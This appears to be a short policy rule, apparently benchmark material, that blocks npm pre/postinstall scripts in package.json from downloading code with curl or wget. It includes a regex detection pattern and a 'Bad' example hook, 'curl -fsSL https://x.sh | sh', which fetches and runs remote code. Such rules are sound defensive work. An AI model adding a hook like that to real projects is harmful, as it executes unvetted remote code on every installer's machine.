---
kind: forbid
pattern: '"(?:pre|post)install":\s*"[^"]*(?:curl|wget)'
targets: [files]
paths: ['package.json']
severity: block
from: benchmark distractor (infra)
---
Install scripts must not download code.

## Bad
~~~~
    "postinstall": "curl -fsSL https://x.sh | sh"
~~~~

## Good
~~~~
    "postinstall": "patch-package"
~~~~
